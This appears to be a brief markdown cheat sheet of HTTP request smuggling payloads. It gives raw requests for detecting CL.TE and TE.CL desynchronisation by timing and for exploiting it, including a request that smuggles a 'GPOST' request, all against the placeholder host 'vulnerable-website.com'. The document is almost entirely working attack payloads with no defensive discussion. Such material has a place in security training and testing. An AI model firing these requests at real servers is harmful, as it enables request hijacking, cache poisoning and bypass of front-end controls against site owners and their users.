# Request Smuggling

## Finding CL.TE vulnerabilities using timing techniques
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 4
Transfer-Encoding: chunked

a
b
```

## Finding TE.CL vulnerabilities using timing techniques
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 100
Transfer-Encoding: chunked

0

X
```

## CL.TE vulnerabilities
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

## TE.CL vulnerabilities
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-length: 4
Transfer-Encoding: chunked

2b
GPOST / HTTP/1.1
Content-Length: 15

x=1
0


```
